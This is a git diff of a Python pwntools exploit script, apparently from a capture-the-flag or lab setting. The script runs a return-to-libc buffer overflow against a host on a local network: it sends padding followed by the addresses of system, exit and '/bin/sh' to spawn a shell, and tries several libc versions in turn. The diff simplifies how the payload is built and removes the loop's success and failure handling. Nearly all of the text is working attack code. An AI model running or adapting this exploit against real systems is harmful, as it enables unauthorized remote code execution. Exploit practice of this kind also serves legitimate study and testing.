@@ -1,6 +1,6 @@
 import json
 import requests
-from pwn import remote, u32, p32, flat, log
+from pwn import remote, u32, p32, log
 
 # Static Configuration
 CONN, PORT = '192.168.0.156', 9000
@@ -47,13 +47,7 @@ def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
     binsh_addr = libc_base + binsh_offset
     
     # Create and send system('/bin/sh') buffer overflow payload
-    payload = flat(
-        b'A' * BUFF_SIZE,
-        p32(system_addr), 
-        p32(exit_addr), 
-        p32(binsh_addr),
-
-    )
+    payload = b'A' * BUFF_SIZE +p32(system_addr) + p32(exit_addr) + p32(binsh_addr)
 
     proc.sendline(payload)
     log.success("Triggered system('/bin/sh') via buffer overflow.")
@@ -115,19 +109,7 @@ def main():
         puts_off, system_off, exit_off, binsh_off = (int(offsets[sym], 16) for sym in ["puts", "system", "exit", "str_bin_sh"])
 
         # Attempt return-to-libc attack with the current libc version's offsets
-        ret_val = attempt_r2libc(puts_off, system_off, exit_off, binsh_off)
-
-        # Handle the result of the exploitation attempt
-        if ret_val == 200:
-            print("Shell interaction finished successfully.")
-            break
-        else:
-            log.failure("Exploit failed with the current libc version. Attempting next version...")
-            proc.close()
-
-    else:
-        print("All potential libc versions have been attempted. Exploit may have failed.")
-        proc.close()
+        attempt_r2libc(puts_off, system_off, exit_off, binsh_off)
 
 
 if __name__ == "__main__":
